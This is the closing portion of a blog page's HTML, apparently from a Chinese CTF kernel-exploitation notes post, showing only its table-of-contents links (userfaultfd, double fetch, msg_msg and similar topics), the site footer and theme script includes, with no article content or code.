href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-7"><span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-27"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-27"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WDB2024-PWN03"><span class="nav-text">WDB2024 PWN03</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-28"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-28"><span class="nav-text">exp</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="nav-text">内核条件竞争</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#double-fetch"><span class="nav-text">double fetch</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-29"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0CTF2018-Final-baby-kernel"><span class="nav-text">0CTF2018 Final baby kernel</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB"><span class="nav-text">侧信道攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#userfaultfd"><span class="nav-text">userfaultfd</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-32"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B0%E7%89%88%E6%9C%AC%E5%86%85%E6%A0%B8%E5%AF%B9%E6%8A%97"><span class="nav-text">新版本内核对抗</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CTF-%E4%B8%AD%E7%9A%84-userfaultfd-%E6%9D%BF%E5%AD%90"><span class="nav-text">CTF 中的 userfaultfd 板子</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#setxattr-userfaultfd"><span class="nav-text">setxattr + userfaultfd</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FUSE-race"><span class="nav-text">FUSE race</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#punch-hole"><span class="nav-text">punch hole</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-33"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-31"><span class="nav-text">exp</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Kernel-Trick"><span class="nav-text">Kernel Trick</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9%E7%AC%A6%E5%8F%B7%E9%93%BE%E6%8E%A5"><span class="nav-text">修改符号链接</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%8E%E5%86%85%E5%AD%98%E6%90%9C%E7%B4%A2-flag"><span class="nav-text">从内存搜索 flag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%8E-sys-kernel-notes-%E6%B3%84%E9%9C%B2%E5%86%85%E6%A0%B8%E5%9C%B0%E5%9D%80"><span class="nav-text">从 &#x2F;sys&#x2F;kernel&#x2F;notes 泄露内核地址</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%BB%93%E6%9E%84%E4%BD%93%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-text">常见结构体的利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97"><span class="nav-text">system V 消息队列</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pipe-%E7%AE%A1%E9%81%93%E7%9B%B8%E5%85%B3"><span class="nav-text">pipe 管道相关</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#io-uring-%E4%B8%8E%E5%BC%82%E6%AD%A5-IO-%E7%9B%B8%E5%85%B3"><span class="nav-text">io_uring 与异步 IO 相关</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#msg-msg"><span class="nav-text">msg_msg</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#poll"><span class="nav-text">poll</span></a></li></ol></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
            <div class="customize-info my-1">关山初度尘未洗，策马扬鞭再奋蹄。</div>
        
        <div class="text-center">
            &copy;
            
              <span>2023</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-circle-info fa-beat-fade" style="--fa-beat-fade-opacity: 0.67; --fa-beat-fade-scale: 1.075;" ></i>&nbsp;&nbsp;<a href="/">韩乔落</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        135 posts in total
                    </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
		<li class="go-comment">
			<i class="fa-regular fa-comments"></i>
		</li>
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	
	<div class="search-pop-overlay">
	<div class="popup search-popup">
		<div class="search-header">
			<span class="search-input-field-pre">
				<i class="fa-solid fa-keyboard"></i>
			</span>
			<div class="search-input-container">
				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
			</div>
			<span class="popup-btn-close">
				<i class="fa-solid fa-times"></i>
			</span>
		</div>
		<div id="search-result">
			<div id="no-result">
				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
			</div>
		</div>
	</div>
</div>
	

</main>


<script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/libs/Swup.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/libs/SwupSlideTheme.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/libs/SwupScriptsPlugin.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/libs/SwupProgressPlugin.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/libs/SwupScrollPlugin.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/libs/SwupPreloadPlugin.min.js" ></script>
<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	<script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/tools/imageViewer.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/utils.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/main.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/layouts/navbarShrink.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/tools/scrollTopBottom.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/tools/lightDarkSwitch.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/layouts/categoryList.js" ></script>


    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/tools/localSearch.js" ></script>



    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/tools/codeBlock.js" ></script>



    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/layouts/lazyload.js" ></script>



    <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/tools/runtime.js" ></script>
    <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/libs/odometer.min.js" ></script>
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/assets/odometer-theme-minimal.css">



  <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/libs/Typed.min.js" ></script>
  <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/plugins/typed.js" ></script>







    <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/libs/anime.min.js" ></script>




    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/tools/tocToggle.js" data-swup-reload-script></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/layouts/toc.js" data-swup-reload-script></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/plugins/tabs.js" data-swup-reload-script></script>


<script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/libs/moment-with-locales.min.js" data-swup-reload-script></script>
<script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/layouts/essays.js" data-swup-reload-script></script>




	
</body>

</html>